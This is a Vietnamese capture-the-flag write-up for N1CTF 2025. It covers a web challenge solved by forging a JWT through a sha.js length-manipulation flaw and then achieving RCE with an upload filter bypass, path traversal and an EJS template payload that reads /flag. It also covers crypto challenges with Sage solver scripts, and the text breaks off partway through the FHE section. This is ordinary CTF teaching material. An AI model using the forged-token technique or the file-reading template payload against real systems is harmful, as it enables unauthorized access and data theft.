# N1CTF 2025

![image](https://hackmd.io/_uploads/HJeok-klbe.png)

> Nguyễn Trọng Nhân 24521236 ATTN2024
> Lê Công Danh 22520199  ATTT2022.1

## Web
### eezzjs
Truy cập vào trang chính của challenge:
![image](https://hackmd.io/_uploads/ry2fT7UJbx.png)

Chúng ta sẽ được tiếp cận với 2 endpoint chính là **/login** và **/upload**, challenge yêu cầu phải login trước mới được truy cập vào **/upload**, nếu không sẽ bị redirect:
![image](https://hackmd.io/_uploads/SybCnXIy-x.png)

Challenge này được cung cấp source code đi kèm, source code sẽ có 2 file js chính để xử lý các logic của challenge là **app.js** và **auth.js**, ta sẽ xem qua hàm **loginUser** của **app.js**:
```js
function loginUser(req, res) {
    const { username, password } = req.body || {};

    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'Username or password format is invalid' });
    }

    const trimmedUsername = username.trim();
    const userRecord = users.get(trimmedUsername);
    if (!userRecord) {
        return res.status(401).json({ error: 'Incorrect username or password' });
    }

    const passwordHash = hashPassword(password, trimmedUsername);
    if (passwordHash !== userRecord.passwordHash) {
        return res.status(401).json({ error: 'Incorrect username or password' });
    }

    const token = signJWT({ username: trimmedUsername }, { expiresIn: 3600 });
    res.cookie(TOKEN_COOKIE_NAME, token, {
        httpOnly: true,
        maxAge: 3600 * 1000,
    });
    return res.status(204).send();
}
```
Hàm này sẽ nhận các tham số username và password do người dùng nhập vào và đảm bảo rằng giá trị của các tham số phải thuộc kiểu **string**, sau đó username sẽ được xóa  bỏ các kí tự khoảng trắng ở đầu và cuối bằng hàm **trim()**. Tiếp đến nó sẽ tìm kiếm trong object **users** có username nào do người dùng nhập vào không, nếu có thì nó sẽ tiếp tục xử lý password nhập vào qua hàm **hashPassword()**. Nếu tất cả đều hợp lí, nó sẽ trả về cookie là một dạng **JWT**.

Trước tiên, ta sẽ kiểm tra object **users** chứa các thuộc tính gì:
```js
const users = new Map();
const ADMIN_USERNAME = 'admin';
const adminPasswordPlain = crypto.randomBytes(9).toString('hex');
const adminPasswordHash = hashPassword(adminPasswordPlain, ADMIN_USERNAME);
users.set(ADMIN_USERNAME, { passwordHash: adminPasswordHash });
```
Như ở trên, ta có thể thấy object **users** trông như sau:
```js
{ 'admin' => { passwordHash: adminPasswordHash } }
```
Vậy để login được thì ta cần username là **admin** và password phải bằng giá trị với **adminPasswordPlain**.

Sau khi đọc qua source code, thì ta sẽ thấy không có cách nào để biết được password của admin, cho nên ta sẽ tìm cách khai thác thẳng qua **JWT**. Ta sẽ cần xem qua hàm chịu trách nhiệm xác thực JWT của challenge. Hàm này sẽ nằm ở trong file **auth.js**:
```js
const JWT_SECRET = crypto.randomBytes(9).toString('hex');

const verifyJWT = (token, secret = JWT_SECRET) => {
    if (typeof token !== 'string') {
        return null;
    }

    const parts = token.split('.');
    if (parts.length !== 3) {
        return null;
    }

    const [encodedHeader, encodedPayload, signature] = parts;

    let header;
    let payload;
    try {
        header = JSON.parse(fromBase64Url(encodedHeader).toString());
        payload = JSON.parse(fromBase64Url(encodedPayload).toString());
    } catch (err) {
        return null;
    }

    const expectedSignatureHex = sha256(...[JSON.stringify(header), payload, secret]);

    let providedSignature;
    let expectedSignature;
    try {
        providedSignature = Buffer.from(signature, 'hex');
        expectedSignature = Buffer.from(expectedSignatureHex, 'hex');
    } catch (err) {
        return null;
    }

    if (
        providedSignature.length !== expectedSignature.length ||
        !crypto.timingSafeEqual(providedSignature, expectedSignature)
    ) {
        return null;
    }

    if (header.alg !== 'HS256') {
        return null;
    }

    if (payload.exp && Math.floor(Date.now() / 1000) >= payload.exp) {
        return null;
    }

    return payload;
};
```
Hàm **verifyJWT()** này sẽ có nhiệm vụ phân tách token thành 3 thành phần thường thấy của JWT là header, payload và signature. Trong đó signature được tính toán bằng cách triển khai hàm **sha256()** sử dụng thư viện **sha.js**. Nhìn qua thì hàm **verifyJWT()** này xác thực JWT rất chặt chẽ, nó đảm bảo rằng thuật toán bắt buộc phải là **HS256**, bên cạnh đó, nó cũng sử dụng hàm **timingSafeEqual()** của thư viện **crypto** để tránh bị **timing attack** cho việc xác thực signature.

Nhưng có một lỗ hổng xuất hiện ở đây, đó là nếu ta nhìn qua file **package.json**, ta sẽ biết rằng challenge sử dụng thư viện **sha.js** phiên bản **2.4.10**. Nếu research trên mạng, ta sẽ tìm thấy **CVE-2025-9288** của phiên bản này của thư viện **sha.js**. PoC:
https://github.com/advisories/GHSA-95m3-7q98-8xr5

Để hiểu rõ lỗ hổng này, ta sẽ cần xem qua đoạn source code sau của hàm **update()** của thư viện **sha.js**:
```js
Hash.prototype.update = function (data, enc) {
  if (typeof data === 'string') {
    enc = enc || 'utf8'
    data = Buffer.from(data, enc)
  }

  var block = this._block
  var blockSize = this._blockSize
  var length = data.length
  var accum = this._len

  for (var offset = 0; offset < length;) {
    var assigned = accum % blockSize
    var remainder = Math.min(length - offset, blockSize - assigned)

    for (var i = 0; i < remainder; i++) {
      block[assigned + i] = data[offset + i]
    }

    accum += remainder
    offset += remainder

    if ((accum % blockSize) === 0) {
      this._update(block)
    }
  }

  this._len += length
  return this
}
```
Lỗ hổng sẽ xảy ra nếu input của chúng ta là một **Object**, và trong Object này có chứa thuộc tính **length**. Như đoạn code trên, ta có thể thấy thuộc tính **length** sẽ được gán bởi **data.length**, tức là input của chúng ta, vì     vậy chúng ta có thể kiểm soát được **this._len**. Nếu chúng ta khiến **this._len luôn trả về 0**, thì nó sẽ làm cho các hàm hash của thư viện **sha.js** luôn trả về cùng một giá trị hash. Để hiểu rõ hơn, chúng ta sẽ xem ví dụ sau:
```js
// Ví dụ
> require('sha.js')('sha256').update('fooabc').update({length:-3}).update('secret').digest('hex')
// Length -3 sẽ xóa 3 kí tự 'abc' khỏi chuỗi 'fooabc' => Chỉ còn lại chuỗi 'foosecret' 
'85c9d9c8394a26951c7b10d8b29d1e4431f3982558d01ec8dcbd3ed66d072ef5'

> require('sha.js')('sha256').update('foosecret').digest('hex')
// Hash của chuỗi 'foosecret'
'85c9d9c8394a26951c7b10d8b29d1e4431f3982558d01ec8dcbd3ed66d072ef5'

> require('sha.js')('sha256').update('fooabc').update({length:-6}).update('secret').digest('hex')
// Length -6 sẽ xóa 6 kí tự 'fooabc' => Chỉ còn chuỗi 'secret'
'2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b'

> require('sha.js')('sha256').update('secret').digest('hex')
// Hash của chuỗi 'secret'
'2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b'
```
Bên cạnh đó, ta cũng cần phải hiểu tại sao phải là kiểu **Object** mà không phải **string** hay **Buffer**. Đối với kiểu **string** thì đơn giản nó sẽ xem giá trị là các kí tự chứ không phải số. Còn đối với **Buffer**, **Buffer** không thể khai thác được lỗ hổng này là vì các giá trị nằm trong Buffer không thể âm, vì nó thuộc kiểu **unsigned 8-bit**.

Sau khi đã hiểu rõ lỗ hổng, ta sẽ tiến hành khai thác challenge, ta sẽ xem lại cách challenge triển khai và xử lý JWT khi sử dụng thư viện **sha.js**:
```js
const sha = require('sha.js');

const sha256 = (...messages) => {
    const hash = sha('sha256');
    messages.forEach((m) => hash.update(m));
    return hash.digest('hex');
};

const verifyJWT = (token, secret = JWT_SECRET) => {
[...]
    let header;
    let payload;
    try {
        header = JSON.parse(fromBase64Url(encodedHeader).toString());
        payload = JSON.parse(fromBase64Url(encodedPayload).toString());
    } catch (err) {
        return null;
    }

    const expectedSignatureHex = sha256(...[JSON.stringify(header), payload, secret]);
[...]
}
```
Như ở trên thì ta sẽ thấy hàm **verifyJWT()** sẽ xác thực JWT của chúng ta bằng cách truyền vào hàm **sha256()** header, payload do chúng ta nhập vào và secret key của challenge. Lỗ hổng xảy ra ở việc challenge đã sử dụng hàm **JSON.stringify** để biến header của chúng ta thành kiểu **string**, nhưng nó lại truyền thẳng payload của chúng ta vào hàm **sha256()**. Tức là chúng ta hoàn toàn có thể truyền một **Object** vào phần payload để khai thác lỗ hổng của thư viện **sha.js**. Ta sẽ tạo ra một đoạn hash để khai thác như sau:
```js
// JWT
> require('sha.js')('sha256').update('{"alg":"HS256","typ":"JWT"}').update({length:-45}).update('<key_length_18>').digest('hex')
'674dcdbbb09261235ee8efc1999daee725dad0ec314a8d1d80cb11229e7596c1'
```
Nhìn vào đoạn trên ta sẽ thấy các tham số được truyền vào **sha256()** lần lượt là:
Header: '{"alg":"HS256","typ":"JWT"}' (string)
Payload: {length:-45} (Object)
Secret: '<key_length_18>' (string)

Tổng độ dài của header sẽ là 27, và tổng độ dài của secret key sẽ là 18 bởi vì secret key được tạo ra như sau:
```js
const JWT_SECRET = crypto.randomBytes(9).toString('hex');
// Ví dụ: 4446b5875b9999ae73
```
=> Chúng ta sẽ cần length là -45 ở phần payload, như thế thì sẽ khiến cho **this._len** trả về 0.

Như ở trên ta đã sinh ra được đoạn hash "674dcdbbb09261235ee8efc1999daee725dad0ec314a8d1d80cb11229e7596c1". Giờ thì chỉ cần tạo ra một JWT dựa trên đoạn hash này là ta có thể bypass được login. Cookie của chúng ta:
```
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZW5ndGgiOi00NX0.674dcdbbb09261235ee8efc1999daee725dad0ec314a8d1d80cb11229e7596c1
```
Với token trên ta đã có thể truy cập được phần upload:
![image](https://hackmd.io/_uploads/BJSRQt_1bg.png)

Mục đích cuối cùng của chúng ta sẽ là RCE để đọc được file flag. Ý tưởng ở đây là chúng ta sẽ tìm cách upload một file ejs và sau đó thực thi nó để đạt được RCE.

Chúng ta sẽ xem qua hàm xử lý file được upload ở **app.js**:
```js
const uploadDir = path.join(__dirname, 'uploads');

function uploadFile(req, res) {
    var {filedata,filename}=req.body;
    var ext = path.extname(filename).toLowerCase();

    if (/js/i.test(ext)) {
        return  res.status(403).send('Denied filename');
    }
    var filepath = path.join(uploadDir,filename);

    if (fs.existsSync(filepath)) {
        return res.status(500).send('File already exists');
    }

    fs.writeFile(filepath, filedata, 'base64', (err) => {
        if (err) {
            console.log(err);
            res.status(500).send('Error saving file');
        } else {
            res.status(200).send({ message: 'File uploaded successfully', path: `/uploads/${path}` });
        }
    });
}
```
Hàm **uploadFile()** sẽ kiểm tra extension của file chúng ta upload lên, nếu nó có chứa các kí tự **"js"** trong đó thì nó sẽ trả về status code 403. Để bypass filter này rất dễ, tả chỉ cần thêm /. vào cuối tên file, ví dụ: exploit.ejs/. Khi này extension sẽ là một chuỗi rỗng. Để kiểm tra thì ta có thể thử như sau:
```js
> require('path').extname("exploit.ejs")
'.ejs'
> require('path').extname("exploit.ejs/.")
''
```
Tiếp theo, ta sẽ tạo một payload cho file ejs này để nó có thể đọc được file flag:
```js
<%= process.mainModule.require('fs').readFileSync('/flag','utf8') %>
```
Payload trên sẽ gọi module **fs** và gọi hàm **readFileSync()** để có thể đọc được file flag.

Một vấn đề khác nữa là file chúng ta upload lên sẽ được đặt ở thư mục **uploads/**, và ta cần đặt nó ở thư mục **views/** vì đây là thư mục chứa các file template của **Express.js**. Để đạt được điều này thì ta chỉ cần khai thác **Path Traversal** ở tên file vì hàm **uploadFile()** không có cơ chế kiểm tra **Path Traversal**.
![image](https://hackmd.io/_uploads/Bk1i9su1be.png)

Như trên hình thì ta đã thành công upload file **exploit.ejs** vào thư mục **views/**.

Cuối cùng, ta sẽ tìm cách thực thi file **exploit.ejs** này, và có một hàm nằm trong **app.js** có thể giúp ta đạt được điều đó:
```js
function serveIndex(req, res) {
    var templ = req.query.templ || 'index';
    var lsPath = path.join(__dirname, req.path);
    try {
        res.render(templ, {
            filenames: fs.readdirSync(lsPath),
            path: req.path
        });
    } catch (e) {
        console.log(e);
        res.status(500).send('Error rendering page');
    }
}

app.get('/', serveIndex);
```
Hàm **serveIndex()** này sẽ nhận giá trị của tham số **templ** do chúng ta nhập vào và thực hiện render file thông qua giá trị của tham số **templ** này.
=> Chỉ cần gửi request tới: **/?templ=exploit.ejs** là chúng ta đã có thể thực thi file **exploit.ejs** và đọc được flag:
![image](https://hackmd.io/_uploads/B18Fnouk-g.png)


## Crypto 
### n1^3
chall: 
```python
from sage.all import * 
FLAG = ZZ.from_bytes(b'aaaaa').digits(257)
F, n = GF(257), len(FLAG)
U, T = [random_matrix(F, n) for _ in ':)']
enc = lambda x: (x * U).apply_map(lambda c: c**3) * T
print(enc(vector(F[",".join(f"x{i}" for i in range(n))].gens())))
print(enc(vector(F, FLAG)))
```

#### Solve: 
Flag được chia ra làm 35 phần base257 và hàm enc sẽ như sau: 

$$
\begin{array}{c}
    \text{KeyGen: }\\
        \left\{
            \begin{aligned}
                U :&= \text{random\_matrix}_{n \times n}\\
                T :&= \text{random\_matrix}_{n \times n}
            \end{aligned}
        \right.\\
    \downarrow\\
    \text{Encryption:}\\
    \begin{bmatrix}
    enc_1\\
    enc_2\\
    \vdots\\
    enc_n
\end{bmatrix}=\left(
\begin{bmatrix}
U_{11} & U_{12} & \cdots & U_{1n} \\
U_{21} & U_{22} & \cdots & U_{2n} \\
\vdots & \vdots & \ddots & \vdots \\
U_{n1} & U_{n2} & \cdots & U_{nn}
\end{bmatrix}
\cdot
\begin{bmatrix}
pt_1 \\
pt_2 \\
\vdots \\
pt_n
\end{bmatrix}
\right)^{\bullet3} 
\times 
\begin{bmatrix}
T_{11} & T_{12} & \cdots & T_{1n} \\
T_{21} & T_{22} & \cdots & T_{2n} \\
\vdots & \vdots & \ddots & \vdots \\
T_{n1} & T_{n2} & \cdots & T_{nn}
\end{bmatrix}\\
\Leftrightarrow\begin{bmatrix}
    enc_1\\
    enc_2\\
    \vdots\\
    enc_n
\end{bmatrix}=
\begin{bmatrix}
\left(U_{11}\,pt_1 + U_{12}\,pt_2 + \cdots + U_{1n}\,pt_n\right)^3 \\
\left(U_{21}\,pt_1 + U_{22}\,pt_2 + \cdots + U_{2n}\,pt_n\right)^3 \\
\vdots \\
\left(U_{n1}\,pt_1 + U_{n2}\,pt_2 + \cdots + U_{nn}\,pt_n\right)^3
\end{bmatrix}\times \begin{bmatrix}
T_{11} & T_{12} & \cdots & T_{1n} \\
T_{21} & T_{22} & \cdots & T_{2n} \\
\vdots & \vdots & \ddots & \vdots \\
T_{n1} & T_{n2} & \cdots & T_{nn}
\end{bmatrix}
\end{array}
$$
Viết gọn hơn thì nó như này: 

$$
\begin{array}{c}
\boxed{y = \mathrm{enc}(x) = (xU)^{\circ 3} T}
\end{array}
$$

1. Công thức ánh xạ: 

Đặt:

$$
L(x)=U^T\cdot x = (L_1(x),\cdots,L_n(x))\ \text{với } L_{j}(x)=\langle x,u_j \rangle
$$

$$
\Rightarrow enc(plaintext)=F(x)= (L_1(x)^3,\cdots,L_n(x)^3)\cdot T.
$$

NOTE: $L(x)^3$ là các đa thức bậc 3 thuần nhất.

Xét:

$$
\begin{array}{c}
    \text{Đặt x} \in \mathbb{F}^n. \text{Gọi } U=[u_1,u_2,\cdots,u_n] (\text{mỗi } u_i \text{ là 1 cột}): \\
    L(x)=U^T\cdot x=(L_1(x),L_2(x),\cdots,L_n(x)), L_j(x)=u^T_j \cdot x
\end{array}
$$

là đa thức bậc 1 tuyến tính, các khối lập phương $L_j(x)^3$ là bậc 3 thuần nhất.
Đặt:

$$
\begin{array}{c}
    f(x)= L(x)^3 = \sum_{j=1}^{n} L_j(x)^3 ( \text{ tương đương } r^T\cdot F(x) \mid r =\ \text{vector toàn 1})
\end{array}
$$

Với $z=U^T\cdot x$ (đặt $z_j=L_j(x)$ ), ta có:

$$
\begin{array}{c}
    .∇f(x)=\sum_{j=1}^{n}3\cdot z_j^{\bullet 2}\cdot u_j= U\cdot(3\cdot z^{\bullet 2})\\
    \downarrow\\
    \boxed{∇^2f(x)=\sum_{j=1}^{n} 6 \cdot z_j\cdot u_j \cdot u_j^T }​
\end{array}
$$

- chú thích: 
    - $u_j=U\cdot e_j$, với $e_j$ là vector đơn vị và $E_j=e_j\cdot e_j^T$ ma trận có 1 ô ở vị trí $(j,j)$.
    - Nên $u_j\cdot u_j^T = (U\cdot e_j)\cdot (U\cdot e_j)^T=U\cdot E_j\cdot U^T$ 

Do đó: 

$$
\begin{array}{c}
\boxed{∇^2f(x)=U\cdot \text{diag}(6\cdot z)\cdot U^T }
\end{array}
$$

Đây chính là [hessian matrix](https://en.wikipedia.org/wiki/Hessian_matrix) - đơn giản là ta có một hàm vô hướng $f(x):\mathbb{F}^n\rightarrow \mathbb{F}$ thì hessian của chúng là: 

$$
\begin{array}{c}
    \left\{
        \begin{aligned}
            f(\,x_1,x_2,\cdots,x_n)&\rightarrow H_f(\,x_1,x_2,\cdots,x_n)\\
            H_f(\,x_1,x_2,\cdots,x_n)&=
            \begin{bmatrix}
\frac{\partial^2 f}{\partial x_1^2}
& \frac{\partial^2 f}{\partial x_1 \partial x_2}
& \cdots
& \frac{\partial^2 f}{\partial x_1 \partial x_n}
\\[12pt]
\frac{\partial^2 f}{\partial x_2 \partial x_1}
& \frac{\partial^2 f}{\partial x_2^2}
& \cdots
& \frac{\partial^2 f}{\partial x_2 \partial x_n}
\\[12pt]
\vdots & \vdots & \ddots & \vdots
\\[12pt]
\frac{\partial^2 f}{\partial x_n \partial x_1}
& \frac{\partial^2 f}{\partial x_n \partial x_2}
& \cdots
& \frac{\partial^2 f}{\partial x_n^2}
\end{bmatrix}
        \end{aligned}
    \right.
\end{array}
$$

Lấy 2 điểm a,b: 

$$
\begin{array}{c}
    \left\{
    \begin{aligned}
    H_f(a) = U\,\mathrm{diag}(6U^\top a)\,U^\top,\\ 
H_f(b) = U\,\mathrm{diag}(6U^\top b)\,U^\top.
    \end{aligned}
    \right.\\
    \downarrow\\
    \begin{aligned}
    M&:=H_f(a)\cdot H_f(b)^-1\\
    &=U\cdot \,\mathrm{diag}(6U^\top a)\cdot \,U^\top \cdot U^{-T}\,\cdot \mathrm{diag}(6U^\top a)^{-1}\cdot \,U^{-1}\\
    &= U\cdot \,\mathrm{diag}(6U^\top a)
    \cdot \mathrm{diag}(6U^\top a)^{-1}\cdot \,U^{-1}\\
    &=U\cdot \text{diag}(\frac{6U^Ta}{6U^Tb})\cdot U^{-1}=U\cdot \text{diag}(\frac{U^Ta}{U^Tb})\cdot U^{-1}\\
    &=U\cdot D\cdot U^{-1}\ |\ D=\text{diag}(\frac{U^Ta}{U^Tb})
    \end{aligned}
\end{array}
$$

Ta lại có: 
- Định nghĩa: v là eigenvetor phải của M với trị riềng $\lambda$ nếu $M\cdot v =\lambda \cdot v$ (bên phải)
- Từ $M=U\cdot D \cdot U^{-1}$, lấy $e_j$ là vector đơn vị, ta có:
    
$$
\begin{array}{c}
M\cdot (Ue_j)=U\cdot D\cdot U^{-1}\cdot U \cdot e_j=U\cdot D\cdot e_j = \lambda\cdot U\cdot e_j
\end{array}
$$

Nhưng $U\cdot e_j$ chính là cột thứ j của U , ký hiệu $u_j$.
Vậy mỗi cột $u_j$ là một eigenvector phải của M, với trị riêng $\lambda_j$.
Nếu các trị riêng phân biệt, ta hoàn toàn thu được đủ n eigenvetors độc lập, ghép chúng thành ma trận $\hat{U}$.
- NOTE:
    - Trong sage có hỗ trợ eigenvectors_right(): trả về danh sách (λ,[các vector cơ sở],bội hình học), ta thu thập đủ n vector và xem rank chúng có bằng nhau không nếu có thì đúng không thì làm lại.

script tìm $\hat{U}$: 
```python
def hessian_of(g, xs):
    R = g.parent()
    n = len(xs)
    H = matrix(R, n, n)
    for i in range(n):
        gi = g.derivative(xs[i])
        for j in range(n):
            H[i, j] = gi.derivative(xs[j])
    return H

def recover_U_hat(P):
    R = P[0].parent()
    F = R.base_ring()
    n = len(P)
    xs = R.gens()
    while True:
        g = sum( P[k] for k in range(n))
        Hpoly = hessian_of(g, xs)
        a = vector(F, [F.random_element() for _ in range(n)])
        b = vector(F, [F.random_element() for _ in range(n)])

        Ha = _subs_poly_matrix(Hpoly, xs, a)
        Hb = _subs_poly_matrix(Hpoly, xs, b)
        if not Hb.is_invertible():
            continue
        M = Ha*Hb.inverse()
        ev = M.eigenvectors_right()
        U_hat = matrix(F, n, n)
        cols = []
        for lam, vecs, mult in ev:
            for v in vecs:
                cols.append(vector(F, v))
                if len(cols) == n:
                    break
            if len(cols) == n:
                break
        if len(cols) < n:
            continue
        for j in range(n):
            U_hat.set_column(j, cols[j])
        if U_hat.rank() == n:
            return U_hat
```

Bước cuối cùng là tìm $\hat T$: Ta giải phương trình $P(x)=((x\cdot \hat{U})^{\bullet3})\cdot \hat{T}$
script tìm $\hat{T}$:
```python
def _subs_poly_matrix(Mp, xs, v):
    n = Mp.nrows(); m = Mp.ncols()
    F = xs[0].parent().base_ring()
    mp = matrix(F, n, m)
    submap = { xs[i]: v[i] for i in range(len(xs)) }
    for i in range(n):
        for j in range(m):
            mp[i, j] = Mp[i, j].subs(submap)
    return mp

def _eval_polys(P, xs, v):
    F = P[0].parent().base_ring()
    submap = { xs[i]: v[i] for i in range(len(xs)) }
    return vector(F, [f.subs(submap) for f in P])

def recover_T(P):
    R = P[0].parent()
    F = R.base_ring()
    n = len(P)
    xs = R.gens()

    U_hat = recover_U_hat(P)

    while True:
        X = [ vector(F, [F.random_element() for _ in range(n)]) for _ in range(n) ]
        S = matrix(F, n, n)
        for s in range(n):
            z = (X[s] * U_hat)
            S.set_row(s, [zi^3 for zi in z])
        if not S.is_invertible():
            continue

        Y = matrix(F, n, n)
        for s in range(n):
            Y.set_row(s, _eval_polys(P, xs, X[s]))

        T_hat = S.solve_right(Y)
        return T_hat, U_hat
```
#### FLAG
```g
F = GF(257)
n = 35
R.<x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,x16,x17,x18,x19,x20,x21,x22,x23,x24,x25,x26,x27,x28,x29,x30,x31,x32,x33,x34> = PolynomialRing(F, n)
enc1 = <....>

tmp = enc1 
c   = <....>
while True:
    P = tmp 
    P = list(P)

    tmp = recover_T(P)
    T,U = tmp 
    c = vector(F,c)
    v = c * T^(-1)
    v = v.apply_map(lambda c: c^171)

    x = v * U^(-1)
    Tinv = T.inverse(); Uinv = U.inverse()
    t = c * Tinv
    z = t.apply_map(lambda a: a^171)
    x = z * Uinv

    assert ((x*U).apply_map(lambda a: a^3) * T) == c
    coeffs = [ZZ(int(a)) for a in x]                     
    N = sum(coeffs[i] * ZZ(257)**i for i in range(len(coeffs)))
    k = max(1, (N.nbits() + 7)//8)
    inner = int(N).to_bytes(k, 'big')                     
    print(inner)
```
![image](https://hackmd.io/_uploads/rJqxzTrk-x.png)
Vì là phương pháp tìm sắp xỉ trên trường hữu hạn nên ta vẫn có xác suất.


### n1fhe

chall:
```python
import tenseal.sealapi as sealapi
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import random, base64, os
FLAG = b"n1ctf{REDACTED}"
assert len(FLAG) == 48

degree = 4096
plain_modulus = sealapi.PlainModulus.Batching(degree, 18)
coeff = sealapi.CoeffModulus.BFVDefault(degree, sealapi.SEC_LEVEL_TYPE.TC128)
parms = sealapi.EncryptionParameters(sealapi.SCHEME_TYPE.BFV)
parms.set_poly_modulus_degree(degree)
parms.set_plain_modulus(plain_modulus)
parms.set_coeff_modulus(coeff)
ctx = sealapi.SEALContext(parms, True, sealapi.SEC_LEVEL_TYPE.TC128)

keygen = sealapi.KeyGenerator(ctx)
public_key = sealapi.PublicKey()
secret_key = keygen.secret_key()
keygen.create_public_key(public_key)

encryptor = sealapi.Encryptor(ctx, public_key)
decryptor = sealapi.Decryptor(ctx, secret_key)
encoder = sealapi.BatchEncoder(ctx)

def generate_poly():
    msg = [random.randint(0, 255) for _ in range(degree)]
    poly = f'{hex(msg[0])[2:]}'
    for i in range(1, len(msg)):
        if msg[i]: poly = f'{hex(msg[i])[2:]}x^{i} + {poly}'
    return sealapi.Plaintext(poly)

def print_enc(ct):
    ct.save("ct")
    print("[enc]", base64.b64encode(open("ct",'rb').read()).decode())

SLOTS = sorted(random.sample(range(0, degree), 16))
key = os.urandom(16)
M = [0 if i not in SLOTS else key[SLOTS.index(i)] for i in range(0, degree)]
plain, key_enc = sealapi.Plaintext(), sealapi.Ciphertext()

encoder.encode(M, plain)
encryptor.encrypt(plain, key_enc)
print_enc(key_enc)

for _ in range(32):
    opt = input("[?] ")
    if opt == "E":
        ct = sealapi.Ciphertext()
        encryptor.encrypt(generate_poly(), ct)
        print_enc(ct)
    elif opt == "D":
        open("dec", 'wb').write(base64.b64decode(input("[b64] ")))
        ct = sealapi.Ciphertext(ctx)
        ct.load(ctx, "dec")
        pt = sealapi.Plaintext()
        decryptor.decrypt(ct, pt)
        print("[*]", pt[0])
    else: break

print("[+]", AES.new(key, AES.MODE_CTR).encrypt(pad(FLAG, 16)).hex())
```
    
#### Solve

Về kiến trúc lẫn các kiến thức xoay quanh mình sẽ không bàn trong blog này, các vấn đề liên quan sẽ có ở : https://hackmd.io/Va6TZjAwTg2c-dmWu03gHg

```python
degree = 4096
plain_modulus = sealapi.PlainModulus.Batching(degree, 18)
                    ...
                    ...
                    ...
SLOTS = sorted(random.sample(range(0, degree), 16))
key = os.urandom(16)
M = [0 if i not in SLOTS else key[SLOTS.index(i)] for i in range(0, degree)]
plain, key_enc = sealapi.Plaintext(), sealapi.Ciphertext()

encoder.encode(M, plain)
encryptor.encrypt(plain, key_enc)
print_enc(key_enc)
```

Server tạo một sheme: 
- Poly defree `n=4096`, batching với `t=PlainModulus.Batching(4096,18)`⇒ t là prime và $t\equiv 1 \mod 2n$
- Sinh 16-bytes AES key ngẫy nhiên `key`.
- Chọn 16 vị trí `SLOTS ⊂ {0..4095}`. Tạo vector `M` độ dài 4096, $M\in\mathbb{Z}^N_t$:

$$
\begin{array}{c}
    M[i]=
    \left\{
        \begin{aligned}
        \text{key}[k], &\ \ \text{nếu } i = \text{SLOTS}[k],\\[6pt]
0,\ \ \ \ \ \ \  & \text{ngược lại.}
        \end{aligned}
    \right.
\end{array}
$$

- Encode M -> Plaintext `plain`
- Encrypt `plain` với `key_enc(bộ c0,c1,#qi,N,bytes)-> hỗ trợ ghép vào ctx (chút nữa sẽ thấy)`
- Cho chúng ta giải mã: bạn gửi bất kỳ ciphertext -> server giải mã rồi in chỉ hệ số hằng pt[0]:
```python
ct = sealapi.Ciphertext(ctx)
ct.load(ctx, "dec")
pt = sealapi.Plaintext()
decryptor.decrypt(ct, pt)
print("[*]", pt[0])
```
- Sau tối đa 32 lần tương tác thì server in ra `AES.new(key, AES.MODE_CTR).encrypt(pad(FLAG,16)).hex()`, `len(flag)=48`  nên block cuối plaintext là 0x10*16
- Mục tiêu cũng chúng ta là recover lại M và lấy được key.

#### Solve:
Bài này mình sẽ chia làm 2 phần: recover_key và decrypt_cipher,
**RECOVER_KEY**

Mục tiêu: khôi phục toàn bộ khóa AES (16 byte) ẩn trong các slot của BFV-batching bằng 32 lần gọi oracle “D”.

Nếu ta gửi lên server một giá trị encode($\beta$) với $\beta$ là vector được ta tính toán theo chiến thuật thì: 

$$
pt[0]= [encode(M\bullet \beta)]_{X^0} = \frac{1}{N} \sum_{j=0}^{N-1} M'[j]\cdot \beta'  \pmod{t},
$$


Vậy pt[0] là gì ??? 

pt[0] chắc chắn không phải là SLOTS[0]: 

$$
\begin{array}{c}
    \left\{
        \begin{aligned}
            encode(M) &= a_0 + a_1\cdot X + a_2\cdot X^2 + \cdots + a_{N-1}\cdot X^{N-1}\\
            a_k &= \frac{1}{N} \sum_{j=0}^{N-1} M'[j] \cdot \zeta_j^{-k} \pmod{t}, \qquad k = 0, \ldots, N-1.
        \end{aligned}
    \right.\\
    \downarrow\\
    \Rightarrow pt[0]=a_0 = \frac{1}{N} \sum_{j=0}^{N-1} M'[j]  \pmod{t}
\end{array}
$$

> Note: các ký hiệu toán học, công thức các bạn xem ở blog được nhắc ở trên

Câu hỏi đặt ra là nếu ta có các giá trị khác nhau - có các biến là phần tứ vector M: 

$$
\begin{array}{c}
	\left\{
        \begin{aligned}
           	pt[0]_1&=\frac{1}{N} \cdot(M'_0\cdot \beta_1 ^0+M'_1\cdot \beta_1^1+M'_2\cdot \beta_1^2+\cdots +M'_{N-1}\cdot \beta_1^{N-1} )\\
           	pt[0]_2&=\frac{1}{N} \cdot(M'_0\cdot \beta_2 ^0+M'_1\cdot \beta_2^1+M'_2\cdot \beta_2^2+\cdots +M'_{N-1}\cdot \beta_2^{N-1} )\\
			\vdots\\
           	pt[0]_{32}&=\frac{1}{N} \cdot(M'_0\cdot \beta_{32} ^0+M'_1\cdot \beta_{32}^1+M'_2\cdot \beta_{32}^2+\cdots +M'_{N-1}\cdot \beta_{32}^{N-1} )\\
        \end{aligned}
    \right.\\
\end{array}
$$


Thì ta có thể recover lại M' không? câu trả lời là có.

Trước hết ta cần tìm $\beta$, điều kiện: 
- Có bậc là N, vì ta không muốn bị wrapped và các phần tử sẽ cộng lại và không thể tách ra , đây là aliasing theo 1 chu kỳ nhất định. 

Và hơn hết ta cần từ ít truy vấn mà vẫn tách được K<=16 slot khác 0 của M'. với oracle in ra hệ số hằng: 

$$
 pt[0]_i = \frac{1}{N} \sum_{j=0}^{N-1} M'[j]\beta_{i}^j  \pmod{t},
$$


Nếu lấy cái số ngẫu nhiên để nhân vào theo từ j, thì $pt[0]_j$ chỉ là một tổng có trọng số khác nhau và nếu làm vay thì ta cần số phương trình ít nhất là >= N ẩn, từ 32 phương trình khôi phục coi như là ``no hope`` $\Rightarrow$ nên ta sử dụng cấp số nhân theo slot để có thể toại được dãy truy hồi tuyến tính bậc K (tối thiểu).



Ta có một thuật toán tìm đa thức tối thiểu cực mạnh: Berlekamp–Massey (BM) ( thuật toán này mình biết được thông qua việc chơi cryptohack/platform số 1 VN và lúc làm bài này mình cũng ngợ ngợ được điều gì đó ).

  
